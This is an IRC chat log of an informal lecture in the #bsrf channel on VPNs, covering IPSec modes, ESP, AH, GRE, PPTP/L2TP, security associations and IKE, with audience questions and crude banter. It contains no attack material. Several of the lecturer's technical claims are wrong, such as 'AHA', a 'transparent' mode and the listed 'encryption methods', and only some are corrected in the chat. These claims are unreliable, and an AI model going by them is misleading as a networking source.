+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; b/c the VPN Gateway has the 
+software to diagnose those packest</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; other forms of QoS</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; is Packet prioritizing at the 
+gateway</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- _Trick- 
+(Trickwitha@j5vFjKG7x6Y.ncl0103.ncl.iprimus.net.au) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and traffic shaping</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and weighted fair queing</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; all those ensure that packets get 
+a fair chance or more important packets</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; get dominant transfport rights 
+over the others</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- dminus01 has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- DigitalFallout has quit (Remote closed the 
+connection)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so that time dependant data can 
+arrive efficiently at the other endnode</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i would also like to mention</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Trick 
+(Trickwitha@j5vFjKG7x6Y.ncl0103.ncl.iprimus.net.au) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; QoS is very difficult to employ on 
+dial up vpn users</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; mainly b/c</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; they are taking so many hops 
+around the shared network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; unlike typicially with branch 
+users</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- CHAOS has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; they connect to the same telco 
+ISP</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; lastly</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; VPN management</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; is quite simple</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the most effective way is via 
+telnet/ssh, CLI editing</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; CLI=command line interface</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; also management can be done at the 
+CA</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the certificate authority 
+server</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; something i will get into in a 
+sec</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; also</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; also</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it is important to keep in mind</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; client management for VPNs </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; selecting the appropriate routers 
+for the job etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; questions?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; -m first</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; why was this held here</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; haha!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_rpc-&gt; HEH</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; k, so lemme put all the info i've 
+absorbed into a more accurate definition of a VPN... (tell me if this is correct 
+or not) a VPN is a method of transport that provides security through encryption 
+and packet header modification that implements a VIRTUAL p2p link between shared 
+networks... correct?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">--- _rpc- is now known as rpc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; instead of #lecture?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; oh i wanted to see the 
+rest :)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; lol, that was some pretty nice ascii 
+art ;-D</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; kf26t3a (kf26t3a@mtdCfs6iqTg.eseenet.com) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; lol @ liquid</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thorn yea</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; k, cool</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; my fingers are tired</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; heheh, i bet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; How are the actual crypto bits 
+handled? What protocols is it using? Aren't the packets encapsulated and not 
+modified at header level? </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i will get into that also</P>
+<P style="MARGIN-BOTTOM: 0cm">* Phaedrus ohs...sits tight</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; at the bit level for you :-D</P>
+<P style="MARGIN-BOTTOM: 0cm">Phaedrus phatal &gt;phatal&lt; they are always 
+held here</P>
+<P style="MARGIN-BOTTOM: 0cm">* Phaedrus has an exam on this stuff in two 
+days</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Pleb&gt; _Jonah_, could you repeat that? I 
+wasn't paying attention.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Pleb&gt; ;)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so lemme sip some whater</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; hi phaedrus</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; hi</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Pleb&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; fuck, i need a more comfortable 
+chair</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; :-\</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; next i'll begin to talk about VPN 
+Architectures &amp;&amp; Implementation</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ithink we all</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; got an idea of how vpns work</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and the fundamental concepts</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i'll go into packet security 
+etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and how the step by step process 
+of VPNs are set up</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and taken down ,, (LOGICALLY of 
+course)</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; _Acolyte- 
+(a@9J3lMVShCog.tnt1.orange.au.da.uu.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there are a whole bunch of </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; architecture arrangements</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; for VPN implementation</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; like i said the most popular</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; are routers on the p2p</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it can b client to router like in 
+the wan-dial up user scenario</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; logically</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; its the encrypted tunnel 
+connection on a shared network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the imediate benefit of a VPN is 
+the tocal cost of ownership</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; instead of leasing lines for p2p 
+connections</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; you have the free access of the 
+(internet) or shared network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; plus</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the sexiest thing is</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Mikkkeee (mike@yxlXiJEpTppc.150.108.234.O) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; link failure is virtually 
+eliminated</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; e.g. in the leased line 
+scenario</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; if there's a cut</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; byebye network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; however in the VPN, link failure 
+is protected using routing protocols</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; like RIP,EIGRP.. etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; those protocols auto sense link 
+failures and redirect traffic</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thers something called IPSsec</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; IPSec</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; (internet protocol security)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; lemme attempt to make a 
+diagram</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; a typical ip packet is designed 
+like this</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; hmm</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- _Acolyte- 
+(a@9J3lMVShCog.tnt1.orange.au.da.uu.net) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the packet is like a rectangle</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; sup ppl</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; |header|data|</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; in the header</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Acolyte 
+(a@9J3lMVShCog.tnt1.orange.au.da.uu.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; theres |destination ip|source 
+ip|dest. port|source port|</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; followed by the data</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; what ipsec does</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it encrypts the entire packet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; before it gets sent out the VPN 
+gateway</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; an dputs it in an entirely new 
+packet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; where - |new header|old 
+packet|</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the entire old packet is put in 
+the data</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; section</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; including the oldheader...etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; take a second to grasp that 
+concept</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Acolyte 
+(a@9J3lMVShCog.tnt1.orange.au.da.uu.net) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; then when that new ipsec packet 
+arrives at the end VPN gateway</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it does the VPN Header checks from 
+the IPSEC header</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; reforms the packet and redirects 
+it on the private network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the IPSec core is located b/w 
+layers 3(network layer) and layer 4(tcp/udp) layer</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; or the ipsec header/ESP (data 
+body)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ESP = hmm</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; something Security Payload</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i forget i'm sorry</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; to reinterate</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the new IPsec packet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; has the new AHA header followed 
+bye the ESP body/data</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ESP ensures packet encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; while</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the AHA... Authentication Hashing 
+Algorithm</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; esures</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; packet delivery</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there are two modes</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; for IPSec</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; tranparent</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and Tunnel mode</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Transparent btw is rarely ever 
+used anymore</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; in trans. mode, only the data is 
+encrypted</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so remote routers located within 
+the tunnel can implement QoS b/c they can read the header</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; in tunnel mode</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the entire packet is 
+encapsulated</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and a new packet is created...</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; just as i describe above</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; now</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; when implementing VPN you may want 
+to use trans. mode if you have a whole bunch of dial up users</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; b/c of all the hops their packets 
+are going to take</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Zomart (Zomart@y9ppfhSBLZ22.om.om.cox.net) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; however the argument to not using 
+it(which is the predominant one)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; is that packet transport integrity 
+is very high</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Chris (melphies@VDSQtysxETo.ipt.aol.com) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so its a more secure soln. to use 
+tunnel mode</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thers another</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; VPN routing/packet protocol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and its GRE.... Generic Routing 
+Encapsulation</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ahh ESP ... Encapsulation Security 
+Payload</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; GRE simply allows APpletalk and 
+IPX/SPX packets to communication over a IP VPN backbone</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ;-D</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; PPTP , point to point tunneling 
+protocol is for Dial up users</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; with all those in mind</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; we move on to something called</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- aphrael has quit ()</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Security Association</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there are a whole bunch of 
+encryption/decryption methods choices to employ</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i.e. DES,AHA,SHA,MD5...etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; also</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there are security keys related to 
+each session</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; all this info is combined in 
+statement of security policies </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; these statements have been 
+negotiated by both endpoints of the VPN connection</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; btw its unidirectional</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- piksel has quit (leaving)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; each endpoin has there own 
+SA...(Security Association)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; QUestions?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; -m!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thnx</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; isn't PPTP for 
+windows, or some shit?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; few comments</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; have to do everything myself 
+here!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; it's AH, not AHA and stands for 
+Authentication Header</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; the E in ESP stands for 
+Encapsulating</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; so... i'm confused... when u 
+mentioned how old packets are encrypted in the data portion of new packets sent, 
+wouldn't that only apply when the nodes sending/receiving data over the VPN were 
+in the middle of a 3 way handshake? (plz don't flame cuz i'm fairly new) But 
+isn't that the only time one node would have to send an OLD packet (at the same 
+time with the new packet) to the other (which would be a syn(old packet) and 
+ack(new packet)?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; PPTP is for Linux</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; PPTP can be used over ethernet, not 
+only dialup</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Trick 
+(Trickwitha@j5vFjKG7x6Y.ncl0103.ncl.iprimus.net.au) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; PPTP is a Microsoft protocol.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; shit</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bloppy-ph33r&gt; :/</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; PPTP&amp;L2F make up L2TP</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; oh nevermind, there is a Linux PPTP 
+client</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; my bad</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so L2tp takes the protocol 
+concepts from PPTP&amp;L2F</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; thank you :)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; (where the ESP, of course, holds 
+the authentication and crypto parameters of the the encrypted bits of the 
+message)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and it is used in it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i believe i said AHA right</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the first time</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; _Jonah_: As far as packet 
+construction goes.....is VPN doing the encryption first, or the authentication 
+first?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; exellent so far carry on... oh 
+and i word from our sponsors:</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; firebit (breno@x13yh906r82.200.60.178.O) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; http://www.happyhacker.com 
+&lt;------ go here if you don't want to learn anything... Go here if you do 
+----&gt; http://blacksun.box.sk/ irc.box.sk #bsrf or #neworder</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Authentication is done first</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; then encapsualtion</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; b0ttyburp: nice way of 
+advertising</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; =P</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; wait, so is the encryption of older 
+packets only implemented during the middle of a 3 way handshake? i'm 
+confused</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; :O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; or is this used more often than i 
+realize....</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; there's also another subsystem of 
+IPSec that you didn't cover: IKE</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i'm getting into INTERNET KEY 
+EXCHANGE</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;kf26t3a&gt; OH LOL</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; any questions on what i just 
+discussed</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; syme 
+(syme@67PiI0RHbbdpp.dyn154.pacific.net.au) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; jonah: u didn't answer my q yet... 
+:-\</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;linuxlogic&gt; nope</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i'm trying to build you guys up 
+for the big blow of the entire processes</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; how many sections yet to 
+coer?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; 1/2 way done</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; shit a 2 hour 
+lecture</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; yeah</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; cool</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well i'm not going to even get 
+into topology</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; i got a test tomorrow, im 
+supposed to be sleeping</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; simprix: said i could do it 
+another time</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; shit, i g2g.... :-(</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; later guys</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; should i continue to morrow</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- th0rn has quit (It's a miracle! I'm 
+actually getting off this damn thing!)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; and full of AWESOME GOODNESS that u 
+cnat find ANYWHERE BUT ON #BSRF!!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; 3D Bi-directional folded torus 
+topology?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; keep going</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;linuxlogic&gt; yes, tommorow!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well there will be a log</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; i am loggin this too</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; plus a 2nd lecture</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; noooooooo</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; finish up today</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; _Jonah_: as long as it takes 
+place before Wednesday</P>
+<P style="MARGIN-BOTTOM: 0cm">* Phaedrus has his exam Wednesday</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; cutting a lecture screws up the 
+flow</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; VPN is aBIG thing</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; okie</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;[PhaLanX]&gt; thank you</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; y do we always miss 
+the porn?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Pleb&gt; nah, people like that screw up the 
+flow..</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; DAMM i did it in here 
+titties</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; now I'm going to cover the basic 
+type of encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; damn lamers</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; kf26t3a (kf26t3a@mtdCfs6iqTg.eseenet.com) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; sweet encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; IPsec assumes SA already exists , 
+SA is derived durring IKE</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; (internet Key exchange)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Mikkkeee has kicked kf26t3a from #bsrf (out 
+with your gay ascii)</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; kf26t3a (kf26t3a@mtdCfs6iqTg.eseenet.com) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; jobs of IKE are</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Mikkkeee has kicked kf26t3a from #bsrf 
+(Mikkkeee)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; -establishes a secure 
+authenticated connected</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; he doesn't deserve to watch this 
+lecture</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; during IKE</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; heheh</P>
